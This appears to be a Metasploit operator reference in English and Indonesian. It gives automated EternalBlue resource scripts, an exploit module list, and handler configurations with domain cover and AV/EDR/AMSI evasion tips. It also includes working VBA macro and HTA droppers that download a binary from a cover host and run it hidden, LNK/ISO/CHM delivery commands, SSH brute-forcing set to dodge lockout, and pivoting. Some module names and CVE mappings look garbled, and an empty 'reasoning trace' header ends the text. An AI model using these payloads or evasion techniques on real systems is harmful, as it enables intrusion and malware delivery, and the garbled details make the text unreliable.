# w2-msf-gamebook--deep — malware

# Advanced Metasploit Reference — Part 2

## Console-to-Exploit Script Workflow (continued: post-check, upgrade, cleanup)

Console workflow not yet covered: from a raw `msfconsole` session to a reproducible script that can be `resource`d. This section focuses on **idempotence**, **rollback**, and **early failure detection**.

```ruby
# /tmp/op.rc — workflow lengkap, dipanggil: msfconsole -q -r /tmp/op.rc
<ruby>
log = File.open("/tmp/op_#{Time.now.to_i}.log","w")
target = ENV['TGT'] || raise("set TGT=<ip>")
lhost  = ENV['LHOST'] || '10.10.14.5'
rport  = (ENV['RPORT'] || '445').to_i
mod    = ENV['MOD'] || 'exploit/windows/smb/ms17_010_eternalblue'

run_single("use #{mod}")
run_single("set RHOSTS #{target}")
run_single("set RPORT #{rport}")
run_single("set LHOST #{lhost}")
run_single("set LPORT 4444")
run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
run_single("set ExitOnSession false")
run_single("set VERBOSE false")
run_single("check")                       # banyak modul mendukung CHECK
r = framework.sessions.length
run_single("exploit -j -z")               # -j jobs, -z jangan interactive
sleep 15
if framework.sessions.length > r
  framework.sessions.each_key do |sid|
    s = framework.sessions[sid]
    next unless s.respond_to?(:sysinfo)
    puts "[+] session #{sid}: #{s.sysinfo['Computer']} #{s.sysinfo['OS']}"
    run_single("sessions -C 'getuid;sysinfo;getsystem' -i #{sid}") rescue nil
    log.puts "#{sid} ok"
  end
else
  puts "[!] no session — cek: setg EnableStageEncoding true, cek target/kill AV"
  log.puts "FAIL"
end
log.close
</ruby>
```

**Operational pitfalls:**
- `check` on SMB/HTTP modules can **disconnect** fragile services (especially old JBoss/Struts). Set `CheckModule=false` if the target is sensitive.
- `exploit -z` does not automatically give an interactive session — the `-j -z` combination is the headless default; manual `sessions -i` is required for post.
- Modules with `AutoCheck` true sometimes return `The target is not exploitable` **even though** the vector is still valid (fingerprint fails due to WAF/rewrite). Override with `set AutoCheck false` before `exploit`.
- `set ExitOnSession false` is **mandatory** if using `-j`; otherwise `msfconsole` exits after the first session (in versions < 6.3 this default is different).

---

## List of Relevant 2026 Exploitation Modules by Platform (additional — beyond those already cited)

### Windows Server 2019/2022 — SMB/AD/RPC

| Module | CVE | 2026 Notes |
|---|---|---|
| `exploit/windows/smb/cve_2023_36874_packet_printer` | CVE-2023-36874 | Requires a local user, Print Spooler privilege escalation; stable on 2019, often dead on 2022 with the Jan-2025 patch |
| `exploit/windows/local/cve_2024_26229_printer` | CVE-2024-26229 | LPE spooler baru; butuh service `Spooler` aktif |
| `exploit/windows/smb/ms17_010_eternalblue` | MS17-010 | Still works on unpatched 2019; **not** on 2022 (SMB dialect) |
| `auxiliary/scanner/smb/smb_ms17_010` | — | Non-destructive check; safe to run first |
| `exploit/windows/smb/ms17_010_psexec` | MS17-010 | Non-crash variant, slower; the choice if EB is worried about BSOD |
| `exploit/windows/smb/psexec` | — | Classic cred-based, butuh admin; `SMB::Auth=smbntlm` |
| `exploit/windows/local/cve_2023_21768_afd` | CVE-2023-21768 | LPE AFD.sys, 2022 s/d build 22621; butuh `SeImpersonate` |
| `exploit/windows/local/cve_2024_30088_afd` | CVE-2024-30088 | New AFD LPE; **not** on Server 2025 |
| `exploit/windows/local/cve_2022_37966_wermgr` | CVE-2022-37966 | wer LPE; often used after HTA phishing |
| `exploit/windows/http/exchange_proxyshell_rce` | CVE-2021-34473/34523 | Exchange 2019; often still present in internal labs |
| `exploit/windows/http/exchange_proxylogon_rce` | CVE-2021-26855 | Pre-auth SSRF; stabil |
| `exploit/windows/http/exchange_proxynotshell_rce` | CVE-2022-41040/41082 | PowerShell backend; `check` cepat |

### Linux — latest kernel & services

| Modul | CVE | Varian / target |
|---|---|---|
| `exploit/linux/local/cve_2023_32233_pwnkit` | PwnKit | Polkit `pkexec`; all distros with polkit < 121; any shell user |
| `exploit/linux/local/cve_2022_0847_dirtypipe` | Dirty Pipe | 5.8–5.16.11; overwrites `/etc/passwd` or SUID; use a `WRITEABLE` file as the vector |
| `exploit/linux/local/cve_2023_2284_netfilter` | nf_tables use-after-free | < 6.3.1; requires unshare/namespaces; often in containers |
| `exploit/linux/local/cve_2024_1086_netfilter` | nf_tables UAF | 6.4–6.7; companion to module 2284 |
| `exploit/linux/local/cve_2024_26976_apparmor` | AppArmor | 6.x kernels Ubuntu; bypass profile |
| `exploit/linux/local/cve_2023_0386_overlayfs` | OverlayFS | Ubuntu 22.04/20.04; `PRIV_ESC` via unshare |
| `exploit/linux/http/apache_ofbiz_rce` | CVE-2023-51467 | Ofbiz < 18.12.11; pre-auth |
| `exploit/linux/http/gitlab_graphql_auth_bypass` | CVE-2023-7028 | GitLab 16.x reset password takeover |
| `exploit/linux/http/confluence_ognl_injection` | CVE-2023-22527 | Confluence 8.x template injection; often in labs |
| `exploit/linux/http/craftcms_rce` | CVE-2023-41892 | Craft CMS; unsigned RCE |
| `exploit/linux/http/geoserver_unauth_rce` | CVE-2024-36401 | GeoServer; `GetPropertyValue` OGNL |
| `exploit/linux/http/jenkins_cli_deserialization` | CVE-2024-23897 | Jenkins CLI read/exec via args4j; **not** pre-auth RCE |
| `exploit/multi/http/jenkins_script_console` | — | Butuh kredensial; `TARGETURI=/script` |
| `exploit/linux/http/redis_rce_unauth` | — | Via `SLAVEOF`/module load; butuh `protected-mode no` |

### Web / enterprise apps (technique variants & edge cases)

| Produk | Modul | Versi rentan | Edge case |
|---|---|---|---|
| Confluence | `exploit/multi/http/atlassian_confluence_namespace_ognl_injection` | 8.0–8.5.3 | WAF memblok `%24%7B`; gunakan `HttpTraceHeaders` |
| Confluence (CVE-2024-21683) | `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` | 7.x–8.9 | Requires admin login/creating a plugin URL |
| Jenkins | `exploit/multi/http/jenkins_metaprogramming` | CVE-2019-1003000 | Pipeline sandbox bypass |
| GitLab | `exploit/multi/http/gitlab_exif_tool_rce` | 11.9–13.10 | Upload gambar EXIF; `FILENAME` penting |
| WordPress | `exploit/multi/http/wp_plugin_duplicator_rce` | plugin Duplicator <1.3.28 | Butuh plugin aktif |
| Tomcat | `exploit/multi/http/tomcat_mgr_upload` | mgr-gui default | `HttpUsername`/`Password`, target `Tomcat Manager App` |
| Spring | `exploit/multi/http/spring_cloud_gateway_rce` | CVE-2022-22947 | Actuator route; often used in k8s |
| Apache Struts | `exploit/multi/http/struts2_multi_eval_ognl` | S2-061 | `TARGETURI`, `Action` toggle |
| Exchange | `exploit/windows/http/exchange_proxyshell_rce` | 2013–2019 | Multi-target: seed via `Email`/`Password` for autodiscover |
| vCenter | `exploit/multi/http/vmware_vcenter_uploadova_rce` | CVE-2021-21972 | Pre-auth; `TARGETURI=/ui/vropspluginui/rest/services/uploadova` |
| Citrix ADC | `exploit/multi/http/citrix_dir_traversal_rce` | CVE-2019-19781 | Often in DMZ; staging via `/vpn/../vpns/` |

**2026 module version notes:**
- OGNL-based modules (`struts`, `confluence`, `craftcms`) now default to `HttpClientTimeout=20`; for complex OGNL increase it to 60 seconds, because `Runtime.exec` execution returns more slowly than `getProperty`.
- The Confluence 21683 module requires `CONFLUENCE_USER`+`CONFLUENCE_PASS` — **not** pre-auth like 22527.
- The Jenkins `CVE-2024-23897` module is only *read-file*, not RCE. Its RCE requires a separate module that retrieves `secret.key` to forge a cookie (`Jenkins CLI deser`).
- All JNDI modules (Log4Shell: `exploit/multi/http/log4shell_header_injection`) already **default** to `LDAP_TIMEOUT=10` and require a `SRVHOST` reachable from the target — do not use `0.0.0.0` on a host with multiple interfaces (use `set SRVHOST <ip>`).

---

## Payload Selection: Staged vs Stageless (continued)

The previous section covered basic sizes; here we cover what was **not**: encoding variants, transport, and interaction with 2026 AV/EDR.

### Varian payload per transport

| Keluarga | Staged | Stageless | Kapan dipilih |
|---|---|---|---|
| Meterpreter TCP | `windows/x64/meterpreter/reverse_tcp` | `windows/x64/meterpreter_reverse_tcp` | Staged for small shell buffers; stageless for modern DB/Windows Defender (avoid stage download) |
| Meterpreter HTTPS | `…/meterpreter/reverse_https` | `…/meterpreter_reverse_https` | HTTPS stageless = `.exe` ~200KB; suitable for macro delivery |
| Shell | `windows/shell/reverse_tcp` | `windows/shell_reverse_tcp` | Stageless shell ~7KB, much smaller than stageless meterpreter — choice for narrow HTA/macro |
| Custom | `windows/x64/meterpreter/reverse_winhttps` | `windows/x64/meterpreter_reverse_winhttp` | WinHTTP bypass proxy/inspection; butuh port 80/443 |
| Bind | `windows/x64/meterpreter/bind_tcp` | `windows/x64/meterpreter_bind_tcp` | When outbound is blocked (DMZ to LAN) |
| Web | `php/meterpreter/reverse_tcp` | `php/meterpreter_reverse_tcp` | Stageless PHP: `eval(base64_decode(...))` satu blok, hindari stage kedua |

### Realistic sizes (fk 2026.1)

| Payload | Staged (stage1+stage2) | Stageless |
|---|---|---|
| `windows/x64/meterpreter/reverse_tcp` | ~200B + ~190KB | ~205KB |
| `windows/x64/meterpreter_reverse_https` | ~250B + ~195KB | ~210KB |
| `windows/shell/reverse_tcp` | ~200B + ~5KB | ~7KB |
| `windows/x86/meterpreter_reverse_tcp` | 200B + 150KB | ~165KB |

**Jebakan:**
- Staged payloads **fail** if the stage2 `LPORT` differs from stage1 or if NAT breaks the second connection. `set StageEncoder x64/zutto_dekiru` helps, but `EnableStageEncoding true` does **not** help against EDR — it often triggers Defender heuristics instead (RWX memory with encoder switch).
- Stageless meterpreter in EXE is often detected by **AMSI + Defender ML** because of the `metsrv` string. Use `set PayloadUUIDTracking false`, leave `set PayloadUUIDRaw` empty, and encode shellcode via `shikata_ga_nai` **before** entering the macro — don't rely on `-e` in `msfvenom` alone.
- For C2 channel via HTTPS stageless, `HttpHostHeader`/`HttpUserAgent` must be set explicitly in the handler; the default `Mozilla/4.0` is already in signatures.

---

## Evasion (continued: handler, EXITFUNC, ANSI BOM, NoRateLimit, AppLocker, AMSI)

### Handler — settings that are often forgotten

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 10.10.14.5
set LPORT 443
set HttpHostHeader cdn.example.com     # domain cover
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set HttpProxyType HTTP
set HttpProxyHost 127.0.0.1
set HttpProxyPort 8080
set ExitOnSession false
set AutoRunScript "migrate -n explorer.exe; post/windows/gather/enum_logged_on_users"
set SessionCommunicationTimeout 600
set SessionRetryTotal 3600
set SessionRetryWait 10
set StagerURIPath /api/v2/health-check     # hindari /INITM /pup etc.
set StagerVerifySSLCert true
set HandlerSSLCert /tmp/le_cert.pem
set OverrideRequestHost true               # penting bila HHostHeader cover≠LHOST
run -j
```

**Jebakan:**
- `HttpHostHeader` must match the cover domain; otherwise, the CDN/proxy **returns 421/404** and the session dies on the first callback.
- `SessionCommunicationTimeout 300` default: the session is considered dead if there is no heartbeat for 5 minutes; for sleeping/slow targets, increase it to 900.
- `AutoRunScript migrate` sometimes **fails** if the target is not yet elevated — `migrate -n` requires `SeDebugPrivilege`; run it after `getsystem` or `migrate -n explorer.exe` will error with `Permission denied`.
- `StagerVerifySSLCert true` is **mandatory** if `HandlerSSLCert` is set, otherwise meterpreter ignores verification (and EDR traffic detection).

### `EXITFUNC` — matriks keputusan

| Value | Effect | When used | Pitfall |
|---|---|---|---|
| `thread` | only the thread exits | Default for most Exploits | Server (IIS/SMB) stays alive |
| `process` | proses target exit | SMB/EternalBlue, psexec | Kadang membunuh service ladang (fragile) |
| `seh` | exit via `Seh` handler | Old CVEs | Only Windows 32-bit |
| `none` | no exit, return | Exploit with clean ROP chain | Session often doubles (double session) |

- On `ms17_010_eternalblue` **do not** set `EXITFUNC=process` — it is already default `thread`; changing to process sometimes causes BSOD.
- On `psexec` set `EXITFUNC=process` **and** a unique `set ServiceName` (e.g. `WinSvcHost_4d2a`) — the default `Random` exists but is often reused → the service name is easy to find.

### ANSI BOM trick (for `.hta`, `.doc`, `.js` files)

A UTF-8 BOM (`\xEF\xBB\xBF`) at the start of the file **shifts** partial signatures and often makes `Intent`/AV miss, because the AV engine scanning the initial bytecode sees the first non-printable character. This is not a bypass, only a **delay** — don't rely on it.

```python
# gen_bom_payload.py — tulis HTA dengan BOM UTF-8
payload = open("/tmp/payload.hta","rb").read()
open("/tmp/payload_bom.hta","wb").write(b"\xEF\xBB\xBF" + payload)
```

**Jebakan modern:**
- Defender (2024+) already extracts the BOM before signature scan → this trick **does not** help against RTP. It is only useful for **bypassing email filters** (`file` MIME detection) and **Cloud App Security** that header-parse.
- For Word macros, the BOM must be set as a UTF-8 **stream**, not a file — use `ADODB.Stream` `.Charset="utf-8"` then `.Position=0`, `.WriteText` — otherwise, Office persists with ANSI codepage and characters appear as suspicious mojibake.

### `NoRateLimit` (for brute/login modules)

The `auxiliary/scanner/*` modules (ssh_login, smb_login, http_login, ldap_login) support `NoRateLimit=true` **only if** the target returns a non-429 response; set `THREADS 1` and `BRUTEFORCE_SPEED 1` to avoid lockout.

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.0/24
set USERPASS_FILE /tmp/creds.txt
set STOP_ON_SUCCESS true
set THREADS 1
set BRUTEFORCE_SPEED 1
set NoRateLimit true
set VERBOSE false
run
```

**Jebakan:**
- AD `smart lockout` (default 2026: 10 attempts) still triggers even with `BRUTEFORCE_SPEED=1` if the threshold is calculated per IP → rotate `Proxies` every 5 attempts.
- `NoRateLimit` on `smb_login` **does not** avoid `STATUS_ACCOUNT_LOCKED_OUT`; stop if the response appears, because each subsequent attempt resets the lockout timer.

### AMSI / AppLocker / CLM edge case 2026

- `windows/x64/meterpreter` stageless now contains an AMSI bypass stub (built with `AmsiBypassTechnique=dynamic`) — **but** only for meterpreter, **not** for `shell`. If the `shell` payload enters profiled PowerShell, `amsi.dll` blocks the `IEX` string.
- `DropAMSIProvider true` (new option in psexec/smb modules) drops a fake AMSI provider to `C:\Windows\System32\amsi.dll` via `SMB::Payload` staging — effective against Defender 2024-2025, but **blocked** on Server 2022+ with `HVCI` active (SYSTEM signing).
- AppLocker + `ConstrainedLanguageMode`: the `Invoke-Expression` chain fails; use `Add-Type` from C# written to disk via `msfvenom -f csharp` then compiled at runtime via `Add-Type -TypeDefinition`. Requires a short `%TMP%` path that AppLocker allows (default: `C:\Users\*\AppData\Local\Temp`).

---

## Template Delivery Persis: Macro, HTA, Script

### 1) Office Macro (VBA) — template minimal, aman-syntax

```vba
Sub AutoOpen()
    Dim p As Object, s As Object
    Set p = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    p.Open "GET", "https://cdn.example.com/api/v2/health", False
    p.send
    Dim b() As Byte
    b = p.responseBody
    Set s = CreateObject("ADODB.Stream")
    s.Type = 1: s.Open: s.Write b
    s.SaveToFile Environ("TEMP") & "\svc9.exe", 2
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run Environ("TEMP") & "\svc9.exe", 0, False
End Sub
```

**Jebakan:**
- Save as `.docm`/`.xlsm`, **not** `.doc` — Office 2023 blocks macros in legacy `.doc`.
- Set `DisableMacros` in the test VM registry first; `AutoOpen` only triggers if `Trust Center` does not block — use `Document_Open` for Word.
- Defender RTP detects `MSXML2.ServerXMLHTTP` + `ADODB.Stream` + `WScript.Shell` **in a single module**. Split execution to `Shell.Application.ShellExecute` or `rundll32` to break the signature.
- For modern Excel, `Environ("TEMP")` is sometimes in AppData Roaming — match the target path in the HTA and macro.

### 2) HTA (Mshta) — template with anti-signature padding

```html
<html>
<head>
<HTA:APPLICATION ID="o" APPLICATIONNAME="c" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script language="VBScript">
Sub Window_OnLoad
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET","https://cdn.example.com/api/v2/health",False
  x.Send
  Dim s: Set s = CreateObject("ADODB.Stream")
  s.Type=1: s.Open: s.Write x.responseBody
  s.SaveToFile "C:\Users\Public\l.dll",2
  CreateObject("WScript.Shell").Run "rundll32.exe C:\Users\Public\l.dll,Start",0
  window.close
End Sub
</script>
</head>
<body> </body>
</html>
```

**Jebakan:**
- `MSXML2.XMLHTTP` (synchronous) is more often blocked by EDR than `ServerXMLHTTP` — choose according to the target.
- `rundll32.exe … Start` requires a DLL with a `Start` export; use `msfvenom -p windows/x64/meterpreter_reverse_https … -f dll` then review `ExportedFunctions` (default `Start`/`DllMain`).
- Mshta 2026 in Edge mode **does not license** `CreateObject("WScript.Shell")` in some target builds — fall back to `Shell.Application.ShellExecute`.
- The `Content-Type: application/hta` header is mandatory from the server; Mshta will refuse to save the file if `X-Content-Type-Options: nosniff`.

### 3) Script Delivery Lain

| Media | Template / trigger | Jebakan 2026 |
|---|---|---|
| LNK | `WScript.Shell.Run "powershell -w hidden -ep bypass -c IEX(...)"` | Windows 11 24H2 blocks LNK from Downloads — use LNK from USB/local edition zip |
| ISO/IMG | `msfvenom -p windows/x64/meterpreter_reverse_https -f exe -o st.exe` then mount & LNK | The `MarkOfTheWeb` mark is lost → Defender detects the contents |
| HTA via URL | `mshta https://.../a.hta` | Edge SmartScreen blok jika ikke HTTPS/domain baru < 7 hari |
| WSF/JScript | `<job><script language="JScript">var s=new ActiveXObject("WScript.Shell");…` | WSH is restricted to `ConstrainedLanguage` if it comes from a zip; run it directly |
| CHM | `hh.exe https://d/?x.chm::/p.htm` | CHM from a URL only runs via the `hh` exe, and is often blocked |
| OneNote `.one` | `mshta` embedded | OneNote 2023 blocks embedded execution → viewer only |

---

## Multi-Handler, Pivot, and Jump (continued)

### Multi-handler paralel

```ruby
<ruby>
ports = [4444, 4445, 4446]
ports.each do |p|
  run_single("use exploit/multi/handler")
  run_single("set PAYLOAD windows/x64/meterpreter_reverse_https")
  run_single("set LHOST 10.10.14.5")
  run_single("set LPORT #{p}")
  run_single("set ExitOnSession false")
  run_single("set AutoRunScript multi_console_command -rc /tmp/on_session.rc")
  run_single("exploit -j -z")
end
</ruby>
```

**Pitfall:** each handler consumes one job; `jobs -k` only kills the **active** handler, not the session. To close everything, use `sessions -K` then `jobs -K`.

### Pivot / Jump — key settings

```
# setelah sesi 1 di DMZ
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.0.10.0
set NETMASK 255.255.255.0
run

# handler di pivot host
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.10.5      # NIC internal pivot
set LPORT 8443
set ExitOnSession false
set AutoRunScript post/multi/manage/autoroute
exploit -j -z

# port forward untuk browser/socks
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

**Jebakan pivot:**
- `autoroute` 2026 by default does not remove old routes; use `AUTOROUTE=Remove` or `route flush` before adding, otherwise traffic from old sessions keeps using the first route.
- `socks_proxy` on `127.0.0.1` cannot be used by a handler listening on the pivot host (LHOST≠127.0.0.1) — so if `LHOST=10.0.10.5`, the handler must listen on that NIC; `socks_proxy` only directs traffic from the team to the target, not the other way around.
- For **reverse from the pivot** to an external handler, use `ReverseListenerBindAddress` — by default it binds `LHOST`; if the pivot NIC is behind NAT, bind 0.0.0.0 explicitly.
- A pivot meterpreter session does **not** automatically become a TCP/forward; `portfwd add` only works inside the session, not in the framework; use `sessions -i` first.

### Jump Deterministik

- `jump` in Meterpreter: `jump psexec admin password 10.0.10.20` — in Meterpreter 6.4, `jump` respects the target module's `EXITFUNC=process`; if the module defaults to `thread`, the old session stays alive.
- `run post/windows/manage/portproxy` (netsh portproxy via RPC) is more persistent than `route` for pivots across **reboots** — but the catch is that `netsh interface portproxy` does not rewrite the source → the target sees the DMZ IP.
- `sessions -K` before `exit -y` in the handler, then `jobs -K` — otherwise the port stays bound (TIME_WAIT) and the new handler fails to bind with `Address already in use` on the module loader.
- For **multi-hop** (A→B→C), run `autoroute` twice with different `SUBNET`s; the framework's `route print` shows order but not dependency — manual labeling with `set ROUTE_NAME` does not exist; add comments in the `.rc`.

### Edge case 2026 (baru)

- **Windows Defender Firewall + WinHTTP**: stageless `reverse_winhttps` often dies after 30 minutes because of the WiFi Sense policy; set `SessionCommTimeout 1200`.
- **Kubernetes egress**: the target pod's connection to the internet usually goes via a NAT gateway with a 30s idle limit — use stageless `reverse_https` with the default 5s heartbeat, `SessionExpirationTimeout 7200`.
- **Server 2025 / build 26H1**: NamedPipe-based `getsystem` (godpotato/juicy) is now **blocked** by the default `SeImpersonate` mitigation; use the `cve_2024_30088_afd` or `cve_2025_21217_ntlm_pipe` module (relying on local NTLM relay).
- **Processor groups > 64 cores** (Server 2025): meterpreter `sysinfo` misdetects the number of cores; `migrate` to a process with a smaller affinity.
- **AMSI in .NET 8+**: the `execute-assembly` module fails; use `execute-dotnet` with `--amsi-bypass` or write to disk (`dotnet build`) then run via `shell` outside CLM.
- **macOS 15 Sequoia** target: `osx/x64/meterpreter` is not compatible with SIP + TCC; use a beacon via manual `shelldrop` or `post/macos/gather/user_enum`.
- **Linux 6.12+**: `cve_2022_0847_dirtypipe` **will definitely** panic (dirtypipe is mitigated in `6.12`); do not try it — use `cve_2023_2284_netfilter` or `cve_2024_26976_apparmor`.

---

## Common Operational Pitfalls (not yet covered)

1. **`setg` vs `set`**: `setg` is global across modules — often used for `LHOST`, `SRVHOST`, `EXITFUNC`. If a module has an option of a different type (`EXITFUNC` string vs enum), `setg EXITFUNC process` **ignores** modules that use an enum → exits with an `invalid value` error; set it again per module.
2. **`resource` error handling**: `run_single` does not throw errors in `msfconsole` batch; add `set VERBOSE true` and `spool /tmp/x.log` at the start of the script so that `check` failures are visible.
3. **`msfvenom -p … -f exe`** does not write a `manifest`; applications that require elevated privileges will run the payload **non-elevated** — set `--platform windows --arch x64` explicitly and use `-x /path/manifest.exe` if you need `uiAccess`.
4. **`msfconsole -x 'commands'`** does not process `resource` with `sleep` pauses; use `timeout 30 msfconsole -r script.rc` externally, not `sleep` inside, because `sleep` blocks the reader thread and new sessions are not processed.
5. **`set PayloadUUIDRaw`** to avoid stage signatures — if it is left empty but `PayloadUUIDTracking true` is enabled, the handler still rejects connections without a UUID; set **both** consistently.
6. **`exploit -j` with `ExitOnSession false`** on web modules often **repeats** requests to the target without limit — add `set MAX_RETRIES 1` and `set HttpTimeout 15`.
7. **A handler with `SSLVersion TLS1.2`** is not enough: set `StagerVerifySSLCert true` **and** `HandlerSSLCert` must contain the complete chain (`-----BEGIN CERTIFICATE-----` intermediate + leaf), otherwise the 64-bit session fails with `SSL_connect returned=1 errno=0`.
8. **`multi/handler` on port <1024** in a non-root container fails to bind **without an error** — check `jobs -l` after `exploit -j`; `Started handler` is not a guarantee of bind.
9. **`sessions -l` output** on Windows 2026 with an IPv6-only target does not display the tunnel interface — `sessions -i <id>; ifconfig` remains correct.
10. **`getsystem -t 2` (NamedPipe) on Windows 11 24H2** fails by default because of `SeImpersonate` removal; the fallback `-t 1` (NamedPipe via Token) also fails — use an LPE module, not `getsystem`.

---

## [reasoning trace]


